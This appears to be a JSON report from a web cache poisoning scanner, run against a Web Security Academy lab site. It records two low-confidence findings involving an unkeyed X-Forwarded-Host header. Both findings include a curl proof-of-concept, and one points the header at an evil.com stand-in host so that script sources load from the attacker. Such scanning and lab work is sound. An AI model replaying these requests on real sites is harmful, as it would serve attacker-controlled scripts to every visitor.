@@ -1,0 +1,251 @@
+{
+  "scan_metadata": {
+    "start_time": "2026-01-16T19:56:25.956440Z",
+    "end_time": "2026-01-16T19:58:13.838626Z",
+    "duration_seconds": 107.882186,
+    "total_domains": 1,
+    "total_urls_tested": 2,
+    "vulnerable_count": 2,
+    "scanner_version": "1.0.0"
+  },
+  "vulnerabilities": [
+    {
+      "domain": "0abc00c5035304c98037da9100f4002c.web-security-academy.net",
+      "url": "https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/",
+      "vector": "unkeyed_header",
+      "injection_point": "X-Forwarded-Host",
+      "cache_type": "keycdn",
+      "confidence": "low",
+      "evidence": {
+        "injected_marker": "cpv2-c21f-c8616710-0fab33ea01",
+        "marker_reflected": true,
+        "marker_persisted": true,
+        "cache_hit_confirmed": true,
+        "persistence_count": 3,
+        "verification_rounds": 4
+      },
+      "poc": {
+        "request": "GET / HTTP/1.1\r\nHost: 0abc00c5035304c98037da9100f4002c.web-security-academy.net\r\nX-Forwarded-Host: cpv2-c21f-c8616710-0fab33ea01\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+        "curl_command": "curl -i -s -H 'X-Forwarded-Host: cpv2-c21f-c8616710-0fab33ea01' 'https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/'",
+        "steps": [
+          "1. Send the following malicious request to poison the cache:",
+          "   curl -i -s -H 'X-Forwarded-Host: cpv2-c21f-c8616710-0fab33ea01' 'https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/'",
+          "2. Wait 2-3 seconds for cache propagation",
+          "3. Access the URL normally (without malicious headers): https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/",
+          "4. Observe that the response contains the injected marker: cpv2-c21f-c8616710-0fab33ea01"
+        ],
+        "notes": [
+          "The 'X-Forwarded-Host' header is not included in the cache key but affects the response."
+        ],
+        "marker": "cpv2-c21f-c8616710-0fab33ea01",
+        "verification_url": "https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/"
+      },
+      "validation": {
+        "checks": [
+          {
+            "name": "cache_key_oracle",
+            "stage": 1,
+            "status": "skipped",
+            "message": "Cache key oracle requires HTTP client",
+            "is_critical": false,
+            "details": null
+          },
+          {
+            "name": "reflection_check",
+            "stage": 2,
+            "status": "passed",
+            "message": "Marker successfully reflected in response",
+            "is_critical": true,
+            "details": {
+              "marker": "cpv2-c21f-c8616710-0fab33ea01"
+            }
+          },
+          {
+            "name": "persistence_check",
+            "stage": 3,
+            "status": "passed",
+            "message": "Marker persisted in all 3 verification requests",
+            "is_critical": true,
+            "details": {
+              "persistence_count": 3,
+              "total_rounds": 3
+            }
+          },
+          {
+            "name": "multi_session",
+            "stage": 4,
+            "status": "skipped",
+            "message": "Multi-session check requires HTTP client",
+            "is_critical": false,
+            "details": null
+          },
+          {
+            "name": "origin_comparison",
+            "stage": 5,
+            "status": "skipped",
+            "message": "Origin comparison requires HTTP client",
+            "is_critical": false,
+            "details": null
+          },
+          {
+            "name": "cache_headers",
+            "stage": 6,
+            "status": "passed",
+            "message": "Response explicitly cacheable by shared caches",
+            "is_critical": false,
+            "details": {
+              "cache_control": "max-age=30",
+              "max_age": 30
+            }
+          },
+          {
+            "name": "content_context",
+            "stage": 7,
+            "status": "passed",
+            "message": "CRITICAL: Marker found in script/resource src. Can load malicious scripts for all users.",
+            "is_critical": false,
+            "details": {
+              "severity": "CRITICAL",
+              "exploit_type": "RESOURCE_HIJACK",
+              "contexts_found": 3
+            }
+          }
+        ],
+        "stages_passed": 4,
+        "total_stages": 7,
+        "is_valid": true,
+        "confidence_adjustment": 0,
+        "final_confidence": "low",
+        "summary": "POSSIBLE: 4/7 stages passed. Manual review recommended.",
+        "rejection_reasons": []
+      }
+    },
+    {
+      "domain": "0abc00c5035304c98037da9100f4002c.web-security-academy.net",
+      "url": "https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/",
+      "vector": "host_override",
+      "injection_point": "X-Forwarded-Host",
+      "cache_type": "keycdn",
+      "confidence": "low",
+      "evidence": {
+        "injected_marker": "cpv2-c21f-c8616710-a4acc9890b",
+        "marker_reflected": true,
+        "marker_persisted": true,
+        "cache_hit_confirmed": true,
+        "persistence_count": 3,
+        "verification_rounds": 4
+      },
+      "poc": {
+        "request": "GET / HTTP/1.1\r\nHost: 0abc00c5035304c98037da9100f4002c.web-security-academy.net\r\nX-Forwarded-Host: cpv2-c21f-c8616710-a4acc9890b.evil.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+        "curl_command": "curl -i -s -H 'X-Forwarded-Host: cpv2-c21f-c8616710-a4acc9890b.evil.com' 'https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/'",
+        "steps": [
+          "1. Send the following malicious request to poison the cache:",
+          "   curl -i -s -H 'X-Forwarded-Host: cpv2-c21f-c8616710-a4acc9890b.evil.com' 'https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/'",
+          "2. Wait 2-3 seconds for cache propagation",
+          "3. Access the URL normally (without malicious headers): https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/",
+          "4. Observe that the response contains the injected marker: cpv2-c21f-c8616710-a4acc9890b"
+        ],
+        "notes": [
+          "The Host header can be overridden via proxy headers, allowing cache poisoning."
+        ],
+        "marker": "cpv2-c21f-c8616710-a4acc9890b",
+        "verification_url": "https://0abc00c5035304c98037da9100f4002c.web-security-academy.net/"
+      },
+      "validation": {
+        "checks": [
+          {
+            "name": "cache_key_oracle",
+            "stage": 1,
+            "status": "skipped",
+            "message": "Cache key oracle requires HTTP client",
+            "is_critical": false,
+            "details": null
+          },
+          {
+            "name": "reflection_check",
+            "stage": 2,
+            "status": "passed",
+            "message": "Marker successfully reflected in response",
+            "is_critical": true,
+            "details": {
+              "marker": "cpv2-c21f-c8616710-a4acc9890b"
+            }
+          },
+          {
+            "name": "persistence_check",
+            "stage": 3,
+            "status": "passed",
+            "message": "Marker persisted in all 3 verification requests",
+            "is_critical": true,
+            "details": {
+              "persistence_count": 3,
+              "total_rounds": 3
+            }
+          },
+          {
+            "name": "multi_session",
+            "stage": 4,
+            "status": "skipped",
+            "message": "Multi-session check requires HTTP client",
+            "is_critical": false,
+            "details": null
+          },
+          {
+            "name": "origin_comparison",
+            "stage": 5,
+            "status": "skipped",
+            "message": "Origin comparison requires HTTP client",
+            "is_critical": false,
+            "details": null
+          },
+          {
+            "name": "cache_headers",
+            "stage": 6,
+            "status": "passed",
+            "message": "Response explicitly cacheable by shared caches",
+            "is_critical": false,
+            "details": {
+              "cache_control": "max-age=30",
+              "max_age": 30
+            }
+          },
+          {
+            "name": "content_context",
+            "stage": 7,
+            "status": "passed",
+            "message": "CRITICAL: Marker found in script/resource src. Can load malicious scripts for all users.",
+            "is_critical": false,
+            "details": {
+              "severity": "CRITICAL",
+              "exploit_type": "RESOURCE_HIJACK",
+              "contexts_found": 3
+            }
+          }
+        ],
+        "stages_passed": 4,
+        "total_stages": 7,
+        "is_valid": true,
+        "confidence_adjustment": 0,
+        "final_confidence": "low",
+        "summary": "POSSIBLE: 4/7 stages passed. Manual review recommended.",
+        "rejection_reasons": []
+      }
+    }
+  ],
+  "statistics": {
+    "total_vulnerabilities": 2,
+    "by_confidence": {
+      "high": 0,
+      "medium": 0,
+      "low": 2
+    },
+    "by_vector": {
+      "unkeyed_header": 1,
+      "host_override": 1
+    },
+    "by_cache_type": {
+      "keycdn": 2
+    },
+    "unique_domains": 1
+  }
+}
